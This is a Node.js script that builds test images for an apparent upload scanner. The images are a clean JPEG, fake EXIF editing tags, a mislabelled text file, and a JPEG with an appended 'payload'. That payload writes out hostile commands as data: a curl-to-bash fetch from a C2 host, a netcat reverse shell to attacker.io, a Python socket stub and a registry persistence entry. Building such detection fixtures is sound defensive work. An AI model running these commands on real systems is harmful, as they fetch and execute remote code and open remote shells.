const fs = require('fs');
const sharp = require('sharp');
const path = require('path');
const piexif = require('piexifjs');

async function generateTestFiles() {
  const dir = path.join(__dirname, 'test_images');
  if (!fs.existsSync(dir)) fs.mkdirSync(dir);

  console.log("Generating Test Files...");

  // 1. Safe Image
  const safePath = path.join(dir, '1_safe_image.jpg');
  await sharp({
    create: { width: 800, height: 600, channels: 3, background: { r: 100, g: 149, b: 237 } }
  }).jpeg().toFile(safePath);
  console.log("✅ Created 1_safe_image.jpg");

  // 2. Appended Payload — also inject EXIF to trigger multiple rules
  const appendPath = path.join(dir, '2_appended_payload.jpg');
  
  // Step 1: Inject suspicious EXIF (editing software) into the clean image first
  const cleanJpegBinary = fs.readFileSync(safePath).toString('binary');
  const zerothApp = {};
  zerothApp[piexif.ImageIFD.Software] = "Adobe Photoshop CC 2024 (Windows)";
  zerothApp[piexif.ImageIFD.Make] = "Canon";
  zerothApp[piexif.ImageIFD.Model] = "EOS 5D Mark IV";
  const exifObjApp = { "0th": zerothApp };
  const exifBytesApp = piexif.dump(exifObjApp);
  const jpegWithExif = piexif.insert(exifBytesApp, cleanJpegBinary);
  const jpegWithExifBuffer = Buffer.from(jpegWithExif, 'binary');

  // Step 2: Append a large realistic-looking malicious payload AFTER the EOF marker
  const payloadLines = [
    "\r\n\r\n<!-- BEGIN HIDDEN PAYLOAD -->",
    "PK\x03\x04", // ZIP magic bytes to look like a zip file
    "#!/bin/bash",
    "# Hidden shell script - injected via steganography",
    "curl -s http://malicious-c2-server.io/payload.sh | bash",
    "nc -e /bin/bash attacker.io 4444",
    "python3 -c \"import socket,subprocess,os;s=socket.socket(...);\"",
    "REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Persist /t REG_SZ /d payload.exe",
    "<!-- END HIDDEN PAYLOAD -->",
  ];
  const maliciousPayload = Buffer.from(payloadLines.join('\n').repeat(3)); // repeat to increase byte count
  
  fs.writeFileSync(appendPath, Buffer.concat([jpegWithExifBuffer, maliciousPayload]));
  console.log("✅ Created 2_appended_payload.jpg (Multi-rule: EXIF spoofing + appended payload = UNSAFE)");

  // 3. Fake Extension
  const fakePath = path.join(dir, '3_fake_extension.jpg');
  fs.writeFileSync(fakePath, "This is actually a plain text file, but it has a .jpg extension to trick the system.");
  console.log("✅ Created 3_fake_extension.jpg");

  // 4. Fake EXIF (Photoshopped)
  const exifPath = path.join(dir, '4_photoshopped_image.jpg');
  
  // Read the clean JPEG into base64 for piexif
  const jpegData = fs.readFileSync(safePath).toString('binary');
  
  // Create EXIF dict with Software tag
  const zeroth = {};
  zeroth[piexif.ImageIFD.Software] = "Adobe Photoshop CS6 (Windows)";
  const exifObj = {"0th": zeroth};
  
  // Dump and insert
  const exifBytes = piexif.dump(exifObj);
  const newJpeg = piexif.insert(exifBytes, jpegData);
  
  // Save
  fs.writeFileSync(exifPath, Buffer.from(newJpeg, 'binary'));
  console.log("✅ Created 4_photoshopped_image.jpg (Will be flagged for Editing Software)");

  console.log("\nDone! Check the 'test_images' folder in your project.");
}

generateTestFiles().catch(console.error);
